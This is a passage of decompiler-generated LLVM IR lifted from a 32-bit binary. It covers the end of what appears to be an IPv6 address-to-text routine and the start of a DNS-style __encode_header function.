  store i32 %v0_804ffa1.pre, i32* @ebp, align 4
  store i32 %v0_804ffbe69, i32* @edi, align 4
  br label %dec_label_pc_804ffa5

dec_label_pc_804ffa5:                             ; preds = %dec_label_pc_804ff98, %dec_label_pc_804ffa1
  %v0_804ff9812 = phi i32 [ %v0_804ffbe69, %dec_label_pc_804ffa1 ], [ %v0_804ffb370, %dec_label_pc_804ff98 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ffa8

dec_label_pc_804ffa8:                             ; preds = %dec_label_pc_804ff93, %dec_label_pc_804ff90, %dec_label_pc_804ff87, %dec_label_pc_804ffa5
  %v0_804ffa314 = phi i32 [ %v0_804ffbe69, %dec_label_pc_804ff93 ], [ %v0_804ffbe69, %dec_label_pc_804ff90 ], [ %v0_804ffa872, %dec_label_pc_804ff87 ], [ -1, %dec_label_pc_804ffa5 ]
  %v0_804ff939 = phi i32 [ -1, %dec_label_pc_804ff93 ], [ %v0_804ff9371, %dec_label_pc_804ff90 ], [ %v0_804ffa872, %dec_label_pc_804ff87 ], [ -1, %dec_label_pc_804ffa5 ]
  %v0_804ff9810 = phi i32 [ %v0_804ffb370, %dec_label_pc_804ff93 ], [ %v0_804ffb370, %dec_label_pc_804ff90 ], [ %v0_804ffb370, %dec_label_pc_804ff87 ], [ %v0_804ff9812, %dec_label_pc_804ffa5 ]
  %v1_804ffa8 = add nuw nsw i32 %v0_804ffa872, 1
  store i32 %v1_804ffa8, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_804ffa8, 8
  br i1 %exitcond, label %dec_label_pc_804ffae, label %dec_label_pc_804ff7b

dec_label_pc_804ffae:                             ; preds = %dec_label_pc_804ffa8
  %v10_804ffae = icmp eq i32 %v0_804ffa314, -1
  br i1 %v10_804ffae, label %dec_label_pc_804ffc0, label %dec_label_pc_804ffb3

dec_label_pc_804ffb3:                             ; preds = %dec_label_pc_804ffae
  %v10_804ffb3 = icmp eq i32 %v0_804ff9810, -1
  %v0_804ffbc.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_804ffb3, label %dec_label_pc_804ffbc, label %dec_label_pc_804ffb8

dec_label_pc_804ffb8:                             ; preds = %dec_label_pc_804ffb3
  %v1_804ffb8 = load i32, i32* @ebp, align 4
  %v7_804ffba = icmp sgt i32 %v0_804ffbc.pre, %v1_804ffb8
  br i1 %v7_804ffba, label %dec_label_pc_804ffbc, label %dec_label_pc_804ffc0.thread

dec_label_pc_804ffc0.thread:                      ; preds = %dec_label_pc_804ffb8
  br label %dec_label_pc_804ffc5

dec_label_pc_804ffbc:                             ; preds = %dec_label_pc_804ffb3, %dec_label_pc_804ffb8
  store i32 %v0_804ffbc.pre, i32* @ebp, align 4
  store i32 %v0_804ffa314, i32* @edi, align 4
  br label %dec_label_pc_804ffc0

dec_label_pc_804ffc0:                             ; preds = %dec_label_pc_804ffae, %dec_label_pc_804ffbc
  %v0_804ffc0 = phi i32 [ %v0_804ff9810, %dec_label_pc_804ffae ], [ %v0_804ffa314, %dec_label_pc_804ffbc ]
  %v10_804ffc0 = icmp eq i32 %v0_804ffc0, -1
  br i1 %v10_804ffc0, label %dec_label_pc_804ffcd, label %dec_label_pc_804ffc0.dec_label_pc_804ffc5_crit_edge

dec_label_pc_804ffc0.dec_label_pc_804ffc5_crit_edge: ; preds = %dec_label_pc_804ffc0
  %v0_804ffc5.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804ffc5

dec_label_pc_804ffc5:                             ; preds = %dec_label_pc_804ffc0.dec_label_pc_804ffc5_crit_edge, %dec_label_pc_804ffc0.thread
  %v0_804ffc5 = phi i32 [ %v1_804ffb8, %dec_label_pc_804ffc0.thread ], [ %v0_804ffc5.pre, %dec_label_pc_804ffc0.dec_label_pc_804ffc5_crit_edge ]
  %v0_804ffc050 = phi i32 [ %v0_804ff9810, %dec_label_pc_804ffc0.thread ], [ %v0_804ffc0, %dec_label_pc_804ffc0.dec_label_pc_804ffc5_crit_edge ]
  %v1_804ffc5 = add i32 %v0_804ffc5, -1
  %v6_804ffc5 = sub i32 0, %v0_804ffc5
  %v7_804ffc5 = and i32 %v0_804ffc5, %v6_804ffc5
  %v8_804ffc5 = icmp slt i32 %v7_804ffc5, 0
  %v9_804ffc5 = icmp eq i32 %v1_804ffc5, 0
  %v10_804ffc5 = icmp slt i32 %v1_804ffc5, 0
  %v3_804ffc8 = icmp eq i1 %v10_804ffc5, %v8_804ffc5
  %v4_804ffc8 = icmp eq i1 %v9_804ffc5, false
  %v5_804ffc8 = and i1 %v4_804ffc8, %v3_804ffc8
  br i1 %v5_804ffc8, label %dec_label_pc_804ffcd, label %dec_label_pc_804ffca

dec_label_pc_804ffca:                             ; preds = %dec_label_pc_804ffc5
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804ffcd

dec_label_pc_804ffcd:                             ; preds = %dec_label_pc_804ffc5, %dec_label_pc_804ffc0, %dec_label_pc_804ffca
  %v0_805006d19 = phi i32 [ %v0_804ffc050, %dec_label_pc_804ffc5 ], [ -1, %dec_label_pc_804ffc0 ], [ -1, %dec_label_pc_804ffca ]
  %v2_804ffcd = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_804ffcd, i32* @ebx, align 4
  %v3_805004f = add i32 %v4_804ff2f, 64
  %v12_805000d = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_805006d62 = icmp eq i32 %v0_805006d19, -1
  %v1_8050015 = icmp eq i1 %v12_805000d, false
  br label %dec_label_pc_804ffd8

dec_label_pc_804ffd8:                             ; preds = %dec_label_pc_804ffcd, %dec_label_pc_8050063
  %v10_805006d68 = phi i1 [ %v10_805006d62, %dec_label_pc_804ffcd ], [ %v10_805006d, %dec_label_pc_8050063 ]
  %v0_804fff267 = phi i32 [ 0, %dec_label_pc_804ffcd ], [ %v1_8050063, %dec_label_pc_8050063 ]
  %v1_804ffe866 = phi i32 [ %v0_805006d19, %dec_label_pc_804ffcd ], [ %v0_805006d.pre, %dec_label_pc_8050063 ]
  %v0_804fff665 = phi i32 [ %v2_804ffcd, %dec_label_pc_804ffcd ], [ %v0_804ffec20, %dec_label_pc_8050063 ]
  %stack_var_-120.164 = phi i8* [ null, %dec_label_pc_804ffcd ], [ %stack_var_-120.0, %dec_label_pc_8050063 ]
  %stack_var_-116.163 = phi i32 [ 32, %dec_label_pc_804ffcd ], [ %stack_var_-116.0, %dec_label_pc_8050063 ]
  br i1 %v10_805006d68, label %dec_label_pc_804fff2, label %dec_label_pc_804ffdd

dec_label_pc_804ffdd:                             ; preds = %dec_label_pc_804ffd8
  %v12_804ffdd = icmp eq i32 %v0_804fff267, %v1_804ffe866
  %v5_804ffdf = icmp slt i32 %v0_804fff267, %v1_804ffe866
  br i1 %v5_804ffdf, label %dec_label_pc_804fff2, label %dec_label_pc_804ffe1

dec_label_pc_804ffe1:                             ; preds = %dec_label_pc_804ffdd
  %v1_804ffe1 = load i32, i32* @ebp, align 4
  %v2_804ffe1 = add i32 %v1_804ffe1, %v1_804ffe866
  store i32 %v2_804ffe1, i32* %eax.global-to-local, align 4
  %v5_804ffe6 = icmp slt i32 %v0_804fff267, %v2_804ffe1
  br i1 %v5_804ffe6, label %dec_label_pc_804ffe8, label %dec_label_pc_804fff2

dec_label_pc_804ffe8:                             ; preds = %dec_label_pc_804ffe1
  %v1_804ffea = icmp eq i1 %v12_804ffdd, false
  br i1 %v1_804ffea, label %dec_label_pc_8050063, label %dec_label_pc_804ffec

dec_label_pc_804ffec:                             ; preds = %dec_label_pc_804ffe8
  %v1_804ffec = inttoptr i32 %v0_804fff665 to i8*
  store i8 58, i8* %v1_804ffec, align 1
  %v0_804ffef = load i32, i32* @ebx, align 4
  %v1_804ffef = add i32 %v0_804ffef, 1
  store i32 %v1_804ffef, i32* @ebx, align 4
  br label %dec_label_pc_8050063

dec_label_pc_804fff2:                             ; preds = %dec_label_pc_804ffe1, %dec_label_pc_804ffdd, %dec_label_pc_804ffd8
  %v1_804fff2 = icmp eq i32 %v0_804fff267, 0
  br i1 %v1_804fff2, label %dec_label_pc_804fffa.thread, label %dec_label_pc_804fffa

dec_label_pc_804fffa.thread:                      ; preds = %dec_label_pc_804fff2
  br label %dec_label_pc_805004e

dec_label_pc_804fffa:                             ; preds = %dec_label_pc_804fff2
  %v1_804fff6 = inttoptr i32 %v0_804fff665 to i8*
  store i8 58, i8* %v1_804fff6, align 1
  %v0_804fff9 = load i32, i32* @ebx, align 4
  %v1_804fff9 = add i32 %v0_804fff9, 1
  store i32 %v1_804fff9, i32* @ebx, align 4
  %v0_804fffa.pre = load i32, i32* @esi, align 4
  %v9_804fffa = icmp eq i32 %v0_804fffa.pre, 6
  %v1_804fffd = icmp eq i1 %v9_804fffa, false
  br i1 %v1_804fffd, label %dec_label_pc_805004e, label %dec_label_pc_804ffff

dec_label_pc_804ffff:                             ; preds = %dec_label_pc_804fffa
  %v0_804ffff = load i32, i32* @edi, align 4
  %v1_804ffff = icmp eq i32 %v0_804ffff, 0
  %v1_8050001 = icmp eq i1 %v1_804ffff, false
  br i1 %v1_8050001, label %dec_label_pc_805004e, label %dec_label_pc_8050003

dec_label_pc_8050003:                             ; preds = %dec_label_pc_804ffff
  %v0_8050003 = load i32, i32* @ebp, align 4
  %v9_8050003 = icmp eq i32 %v0_8050003, 6
  br i1 %v9_8050003, label %dec_label_pc_8050017, label %dec_label_pc_8050008

dec_label_pc_8050008:                             ; preds = %dec_label_pc_8050003
  %v9_8050008 = icmp eq i32 %v0_8050003, 5
  %v1_805000b = icmp eq i1 %v9_8050008, false
  br i1 %v1_805000b, label %dec_label_pc_805004e, label %dec_label_pc_805000d

dec_label_pc_805000d:                             ; preds = %dec_label_pc_8050008
  br i1 %v1_8050015, label %dec_label_pc_805004e, label %dec_label_pc_8050017

dec_label_pc_8050017:                             ; preds = %dec_label_pc_805000d, %dec_label_pc_8050003
  %v2_805001d = sub i32 %v1_804fff9, %v2_804ffcd
  store i32 %v2_805001d, i32* @esi, align 4
  %v2_8050028 = sub i32 46, %v2_805001d
  store i32 %v2_8050028, i32* @ecx, align 4
  %v1_805002a = add i32 %arg2, 12
  store i32 %v1_805002a, i32* @eax, align 4
  store i32 %v1_804fff9, i32* @edx, align 4
  %v0_805002f = load i8*, i8** %stack_var_-124, align 4
  %v1_805002f = ptrtoint i8* %v0_805002f to i32
  %v3_805002f = ptrtoint i8* %stack_var_-120.164 to i32
  %v5_805002f = call i32 @inet_ntop4(i32 %v1_805002f, i32 %v3_805002f, i32 %stack_var_-116.163)
  store i32 %v5_805002f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8050036 = icmp eq i32 %v5_805002f, 0
  br i1 %v1_8050036, label %dec_label_pc_80500c0, label %dec_label_pc_805003e

dec_label_pc_805003e:                             ; preds = %dec_label_pc_8050017
  %v0_8050041 = load i32, i32* @ebx, align 4
  %v5_8050041 = inttoptr i32 %v0_8050041 to i8*
  store i8* %v5_8050041, i8** %stack_var_-124, align 4
  %v3_8050042 = call i32 @strlen(i8* %v5_8050041)
  store i32 %v3_8050042, i32* %eax.global-to-local, align 4
  %v0_805004a = load i32, i32* @ebx, align 4
  %v3_805004a = add i32 %v0_805004a, %v3_8050042
  store i32 %v3_805004a, i32* @ebx, align 4
  %v0_8050072.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050072

dec_label_pc_805004e:                             ; preds = %dec_label_pc_804fffa.thread, %dec_label_pc_805000d, %dec_label_pc_8050008, %dec_label_pc_804ffff, %dec_label_pc_804fffa
  %v1_805004f55 = phi i32 [ 0, %dec_label_pc_804fffa.thread ], [ %v0_804fffa.pre, %dec_label_pc_805000d ], [ %v0_804fffa.pre, %dec_label_pc_8050008 ], [ %v0_804fffa.pre, %dec_label_pc_804ffff ], [ %v0_804fffa.pre, %dec_label_pc_804fffa ]
  %v0_805005854 = phi i32 [ %v0_804fff665, %dec_label_pc_804fffa.thread ], [ %v1_804fff9, %dec_label_pc_805000d ], [ %v1_804fff9, %dec_label_pc_8050008 ], [ %v1_804fff9, %dec_label_pc_804ffff ], [ %v1_804fff9, %dec_label_pc_804fffa ]
  %v0_805004e = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_805004e, i32* %stack_var_-112, align 4
  %v2_805004f = mul i32 %v1_805004f55, 4
  %v4_805004f = add i32 %v3_805004f, %v2_805004f
  %v5_805004f = inttoptr i32 %v4_805004f to i32*
  %v6_805004f = load i32, i32* %v5_805004f, align 4
  %v5_8050058 = inttoptr i32 %v0_805005854 to i8*
  store i8* %v5_8050058, i8** %stack_var_-124, align 4
  %v6_8050059 = call i32 @sprintf(i32 %v0_805005854, i32 ptrtoint ([3 x i8]* @global_var_8052bb1.415 to i32), i32 %v6_805004f, i32 %v0_805004e)
  store i32 %v6_8050059, i32* %eax.global-to-local, align 4
  %v0_8050061 = load i32, i32* @ebx, align 4
  %v2_8050061 = add i32 %v0_8050061, %v6_8050059
  store i32 %v2_8050061, i32* @ebx, align 4
  br label %dec_label_pc_8050063

dec_label_pc_8050063:                             ; preds = %dec_label_pc_804ffe8, %dec_label_pc_804ffec, %dec_label_pc_805004e
  %stack_var_-116.0 = phi i32 [ %v6_805004f, %dec_label_pc_805004e ], [ %stack_var_-116.163, %dec_label_pc_804ffe8 ], [ %stack_var_-116.163, %dec_label_pc_804ffec ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8052bb1.415, i32 0, i32 0), %dec_label_pc_805004e ], [ %stack_var_-120.164, %dec_label_pc_804ffe8 ], [ %stack_var_-120.164, %dec_label_pc_804ffec ]
  %v0_804ffec20 = phi i32 [ %v2_8050061, %dec_label_pc_805004e ], [ %v0_804fff665, %dec_label_pc_804ffe8 ], [ %v1_804ffef, %dec_label_pc_804ffec ]
  %v0_8050063 = load i32, i32* @esi, align 4
  %v1_8050063 = add i32 %v0_8050063, 1
  %v0_805006d.pre = load i32, i32* @edi, align 4
  store i32 %v1_8050063, i32* @esi, align 4
  %v7_8050067 = icmp sgt i32 %v1_8050063, 7
  %v10_805006d = icmp eq i32 %v0_805006d.pre, -1
  br i1 %v7_8050067, label %dec_label_pc_805006d, label %dec_label_pc_804ffd8

dec_label_pc_805006d:                             ; preds = %dec_label_pc_8050063
  br i1 %v10_805006d, label %dec_label_pc_805007e, label %dec_label_pc_8050072

dec_label_pc_8050072:                             ; preds = %dec_label_pc_805006d, %dec_label_pc_805003e
  %v0_805007a = phi i32 [ %v0_804ffec20, %dec_label_pc_805006d ], [ %v3_805004a, %dec_label_pc_805003e ]
  %v0_8050072 = phi i32 [ %v0_805006d.pre, %dec_label_pc_805006d ], [ %v0_8050072.pre, %dec_label_pc_805003e ]
  %v1_8050072 = load i32, i32* @ebp, align 4
  %v2_8050072 = add i32 %v1_8050072, %v0_8050072
  store i32 %v2_8050072, i32* %eax.global-to-local, align 4
  %v9_8050075 = icmp eq i32 %v2_8050072, 8
  %v1_8050078 = icmp eq i1 %v9_8050075, false
  br i1 %v1_8050078, label %dec_label_pc_805007e, label %dec_label_pc_805007a

dec_label_pc_805007a:                             ; preds = %dec_label_pc_8050072
  %v1_805007a = inttoptr i32 %v0_805007a to i8*
  store i8 58, i8* %v1_805007a, align 1
  %v0_805007d = load i32, i32* @ebx, align 4
  %v1_805007d = add i32 %v0_805007d, 1
  store i32 %v1_805007d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805007e

dec_label_pc_805007e:                             ; preds = %dec_label_pc_8050072, %dec_label_pc_805006d, %dec_label_pc_805007a
  %v0_8050082 = phi i32 [ %v0_805007a, %dec_label_pc_8050072 ], [ %v0_804ffec20, %dec_label_pc_805006d ], [ %v1_805007d, %dec_label_pc_805007a ]
  store i32 %v2_804ffcd, i32* %edx.global-to-local, align 4
  %v1_8050082 = add i32 %v0_8050082, 1
  store i32 %v1_8050082, i32* %eax.global-to-local, align 4
  %v1_8050085 = inttoptr i32 %v0_8050082 to i8*
  store i8 0, i8* %v1_8050085, align 1
  %v0_8050088 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050088 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050088 = sub i32 %v0_8050088, %v1_8050088
  store i32 %v2_8050088, i32* @eax, align 4
  %tmp79 = icmp ugt i32 %v2_8050088, %arg4
  br i1 %tmp79, label %dec_label_pc_8050090, label %dec_label_pc_805009d

dec_label_pc_8050090:                             ; preds = %dec_label_pc_805007e
  %v0_8050090 = load i8*, i8** %stack_var_-124, align 4
  %v1_8050090 = ptrtoint i8* %v0_8050090 to i32
  %v2_8050090 = call i32 @__errno_location(i32 %v1_8050090)
  store i32 %v2_8050090, i32* %eax.global-to-local, align 4
  %v1_8050095 = inttoptr i32 %v2_8050090 to i32*
  store i32 28, i32* %v1_8050095, align 4
  br label %dec_label_pc_80500be

dec_label_pc_805009d:                             ; preds = %dec_label_pc_805007e
  %v0_805009d = load i32, i32* @edi, align 4
  store i32 %v0_805009d, i32* %stack_var_-112, align 4
  %tmp46 = bitcast i8** %stack_var_12 to i32*
  %v3_80500a03 = load i32, i32* %tmp46, align 4
  %tmp47 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_80500a03, i32* %tmp47, align 4
  %v0_80500a7.cast = inttoptr i32 %v3_80500a03 to i8*
  %v5_80500a7 = call i32 @strcpy(i8* %v0_80500a7.cast, i32 %v2_804ffcd)
  store i32 %v5_80500a7, i32* %eax.global-to-local, align 4
  store i32 %v5_80500a7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80500c0

dec_label_pc_80500b3:                             ; preds = %dec_label_pc_804ff0c
  %v1_80500b3 = call i32 @__errno_location(i32 %v0_804feff)
  store i32 %v1_80500b3, i32* %eax.global-to-local, align 4
  %v1_80500b8 = inttoptr i32 %v1_80500b3 to i32*
  store i32 97, i32* %v1_80500b8, align 4
  br label %dec_label_pc_80500be

dec_label_pc_80500be:                             ; preds = %dec_label_pc_8050090, %dec_label_pc_80500b3
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80500c0

dec_label_pc_80500c0:                             ; preds = %dec_label_pc_8050017, %dec_label_pc_805009d, %dec_label_pc_804ff17, %dec_label_pc_80500be
  %v0_80500c3 = phi i32 [ 0, %dec_label_pc_8050017 ], [ %v5_80500a7, %dec_label_pc_805009d ], [ %v3_804ff23, %dec_label_pc_804ff17 ], [ 0, %dec_label_pc_80500be ]
  store i32 %v0_80500c3, i32* %eax.global-to-local, align 4
  store i32 %v0_804feff, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80500c3

; uselistorder directives
  uselistorder i32 %v0_80500c3, { 1, 0 }
  uselistorder i32 %v0_8050082, { 1, 0 }
  uselistorder i32 %v1_8050063, { 1, 0, 2 }
  uselistorder i32 %v0_805005854, { 1, 0 }
  uselistorder i32 %v0_804fffa.pre, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804fff9, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %stack_var_-116.163, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.164, { 2, 1, 0 }
  uselistorder i32 %v0_804fff665, { 2, 3, 1, 0 }
  uselistorder i32 %v1_804ffe866, { 2, 0, 1 }
  uselistorder i32 %v0_804fff267, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804ffcd, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_804ffc5, { 1, 0 }
  uselistorder i32 %v0_804ffc5, { 1, 2, 0 }
  uselistorder i32 %v1_804ffa8, { 0, 2, 1 }
  uselistorder i32 %v0_804ff9810, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804ffa314, { 0, 2, 1, 3 }
  uselistorder i1 %v10_804ff93, { 1, 0 }
  uselistorder i32 %v0_804ffbe69, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804ffb370, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804ffa872, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_804ff6373, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_804feff, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 5, 4, 2, 6, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 97, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 1, 0 }
  uselistorder [3 x i8]* @global_var_8052bb1.415, { 1, 0 }
  uselistorder i8 58, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32 65535, { 1, 0, 2 }
  uselistorder i32 64, { 6, 2, 4, 0, 3, 5, 7, 1 }
  uselistorder i32* @esp, { 0, 1, 30, 31, 32, 33, 34, 35, 2, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 17, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 13, 108, 109, 110, 14, 111, 11, 112, 113, 114, 115, 116, 117, 15, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 12, 131, 132, 133, 134, 135, 136, 16, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 3, 4, 197, 5, 6, 18, 159, 160, 161, 162, 19, 163, 164, 165, 166, 167, 21, 168, 169, 170, 23, 171, 24, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 22, 184, 25, 185, 186, 187, 26, 188, 189, 190, 191, 192, 193, 194, 195, 20, 196, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 7, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 8, 63, 64, 65, 66, 68, 67, 69, 70, 71, 72, 78, 10, 73, 29, 74, 75, 28, 76, 77, 79, 80, 81, 82, 9, 83, 84, 85, 86, 27 }
  uselistorder i32 15, { 0, 1, 3, 2 }
  uselistorder i32 60, { 5, 6, 2, 7, 8, 4, 0, 1, 3 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 3, 4, 5, 6, 10, 8, 9, 7, 1, 2 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80500c0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_80500be, { 1, 0 }
  uselistorder label %dec_label_pc_805007e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050063, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805004e, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_804ffd8, { 1, 0 }
  uselistorder label %dec_label_pc_804ffcd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ffc0, { 1, 0 }
  uselistorder label %dec_label_pc_804ffbc, { 1, 0 }
  uselistorder label %dec_label_pc_804ffa8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ffa5, { 1, 0 }
  uselistorder label %dec_label_pc_804ff7b, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i8* @__decompiler_undefined_function_2()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80500cd = load i32, i32* @ebx, align 4
  store i32 %v0_80500cd, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* %ebx.global-to-local, align 4
  %v4_80500d5 = ptrtoint i8* %tmp8 to i32
  store i32 %v4_80500d5, i32* %esi.global-to-local, align 4
  %v7_80500de = icmp sgt i32 %tmp, 11
  br i1 %v7_80500de, label %dec_label_pc_80500e4, label %dec_label_pc_805017a

dec_label_pc_80500e4:                             ; preds = %entry
  %v1_80500e4 = add i32 %tmp9, 1
  %v2_80500e4 = inttoptr i32 %v1_80500e4 to i8*
  %v3_80500e4 = load i8, i8* %v2_80500e4, align 1
  store i8 %v3_80500e4, i8* %tmp8, align 1
  %v0_80500ea = load i32, i32* %ebx.global-to-local, align 4
  %v1_80500ea = inttoptr i32 %v0_80500ea to i32*
  %v2_80500ea = load i32, i32* %v1_80500ea, align 4
  %v1_80500ec = trunc i32 %v2_80500ea to i8
  %v2_80500ec = load i32, i32* %esi.global-to-local, align 4
  %v3_80500ec = add i32 %v2_80500ec, 1
  %v4_80500ec = inttoptr i32 %v3_80500ec to i8*
  store i8 %v1_80500ec, i8* %v4_80500ec, align 1
  %v0_8050112 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050112 = add i32 %v0_8050112, 8
  %v2_8050112 = inttoptr i32 %v1_8050112 to i32*
  %v3_8050112 = load i32, i32* %v2_8050112, align 4
  %v1_8050115 = mul i32 %v3_8050112, 8
  %v2_805011b = or i32 %v1_8050115, 4
  %v1_805011d = add i32 %v0_8050112, 20
  %v2_805011d = inttoptr i32 %v1_805011d to i32*
  %v3_805011d = load i32, i32* %v2_805011d, align 4
  %v4_805011d = icmp eq i32 %v3_805011d, 0
  %v1_8050121 = icmp eq i1 %v4_805011d, false
  %v2_8050121 = zext i1 %v1_8050121 to i32
  %v2_8050124 = or i32 %v2_8050121, %v2_805011b
  %v2_8050126 = or i32 %v2_8050124, -126
  %v5_8050126 = trunc i32 %v2_8050126 to i8
  store i32 %v2_8050126, i32* @ecx, align 4
  %v2_8050128 = load i32, i32* %esi.global-to-local, align 4
  %v3_8050128 = add i32 %v2_8050128, 2
  %v4_8050128 = inttoptr i32 %v3_8050128 to i8*
  store i8 %v5_8050126, i8* %v4_8050128, align 1
  %v0_805012b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050131 = add i32 %v0_805012b, 28
  %v2_8050131 = inttoptr i32 %v1_8050131 to i8*
  %v3_8050131 = load i8, i8* %v2_8050131, align 1
  %tmp13 = urem i8 %v3_8050131, 16
  %v2_805013c = or i8 %tmp13, -128
  %v2_805013e = load i32, i32* %esi.global-to-local, align 4
  %v3_805013e = add i32 %v2_805013e, 3
  %v4_805013e = inttoptr i32 %v3_805013e to i8*
  store i8 %v2_805013c, i8* %v4_805013e, align 1
  %v0_8050141 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050141 = add i32 %v0_8050141, 33
  %v2_8050141 = inttoptr i32 %v1_8050141 to i8*
  %v3_8050141 = load i8, i8* %v2_8050141, align 1
  %v2_8050145 = load i32, i32* %esi.global-to-local, align 4
  %v3_8050145 = add i32 %v2_8050145, 4
  %v4_8050145 = inttoptr i32 %v3_8050145 to i8*
  store i8 %v3_8050141, i8* %v4_8050145, align 1
  %v0_8050148 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050148 = add i32 %v0_8050148, 32
  %v2_8050148 = inttoptr i32 %v1_8050148 to i32*
  %v3_8050148 = load i32, i32* %v2_8050148, align 4
  %v1_805014b = trunc i32 %v3_8050148 to i8
  %v2_805014b = load i32, i32* %esi.global-to-local, align 4
  %v3_805014b = add i32 %v2_805014b, 5
  %v4_805014b = inttoptr i32 %v3_805014b to i8*
  store i8 %v1_805014b, i8* %v4_805014b, align 1
  %v0_805014e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805014e = add i32 %v0_805014e, 37
  %v2_805014e = inttoptr i32 %v1_805014e to i8*
  %v3_805014e = load i8, i8* %v2_805014e, align 1
  %v2_8050152 = load i32, i32* %esi.global-to-local, align 4
  %v3_8050152 = add i32 %v2_8050152, 6
  %v4_8050152 = inttoptr i32 %v3_8050152 to i8*
  store i8 %v3_805014e, i8* %v4_8050152, align 1
  %v0_8050155 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050155 = add i32 %v0_8050155, 36
  %v2_8050155 = inttoptr i32 %v1_8050155 to i32*
  %v3_8050155 = load i32, i32* %v2_8050155, align 4
  %v1_8050158 = trunc i32 %v3_8050155 to i8
  %v2_8050158 = load i32, i32* %esi.global-to-local, align 4
  %v3_8050158 = add i32 %v2_8050158, 7
  %v4_8050158 = inttoptr i32 %v3_8050158 to i8*
  store i8 %v1_8050158, i8* %v4_8050158, align 1
  %v0_805015b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805015b = add i32 %v0_805015b, 41
  %v2_805015b = inttoptr i32 %v1_805015b to i8*
  %v3_805015b = load i8, i8* %v2_805015b, align 1
  %v2_805015f = load i32, i32* %esi.global-to-local, align 4
  %v3_805015f = add i32 %v2_805015f, 8
  %v4_805015f = inttoptr i32 %v3_805015f to i8*
  store i8 %v3_805015b, i8* %v4_805015f, align 1
  %v0_8050162 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050162 = add i32 %v0_8050162, 40
  %v2_8050162 = inttoptr i32 %v1_8050162 to i32*
  %v3_8050162 = load i32, i32* %v2_8050162, align 4
  %v1_8050165 = trunc i32 %v3_8050162 to i8
  %v2_8050165 = load i32, i32* %esi.global-to-local, align 4
  %v3_8050165 = add i32 %v2_8050165, 9
  %v4_8050165 = inttoptr i32 %v3_8050165 to i8*
  store i8 %v1_8050165, i8* %v4_8050165, align 1
  %v0_8050168 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050168 = add i32 %v0_8050168, 45
  %v2_8050168 = inttoptr i32 %v1_8050168 to i8*
